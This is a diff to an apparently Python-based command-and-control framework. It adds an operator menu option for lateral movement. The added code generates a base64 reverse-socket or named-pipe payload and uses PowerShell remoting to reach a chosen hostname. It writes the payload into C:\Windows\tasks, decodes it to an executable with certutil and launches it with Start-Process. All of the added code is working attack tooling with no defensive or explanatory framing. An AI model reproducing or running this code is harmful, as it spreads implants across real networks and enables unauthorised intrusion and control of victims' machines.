@@ -852,6 +852,42 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.HOSTNAME)
                     continue
 
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSJUMP_EXE:
+                    #re-generate payload 
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    if self.__t_mypayload.payloadtype == "socket":
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
+                    else:
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
+                    tosend = t_mypayloadgen.gen_b64()
+                    
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    t_name = uuid.uuid4().hex[:6].upper()
+
+                    removecomplete()
+                    user_input_target = input("Please enter hostname: ")
+                    user_input_path = input("Please enter path to put the files: ") #default Windows\\tasks
+                    if len(user_input_path) == 0:
+                        user_input_path = "C:\\Windows\\tasks"
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+                    
+                    self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
+                    self.__t_myserver.clean_psloadlist(user_input_stager)
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.B64_SAVE.format(tosend,user_input_path,t_name))
+                    self.__t_myserver.create_command(user_input_stager,"ps","certutil -decode {} {}".format(os.path.join(user_input_path,"{}.txt".format(t_name)),os.path.join(user_input_path,"{}.exe".format(t_name))))
+                    self.__t_myserver.create_command(user_input_stager,"ps","Start-Process {}".format(os.path.join(user_input_path,"{}.exe".format(t_name))))
+                    continue
+
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
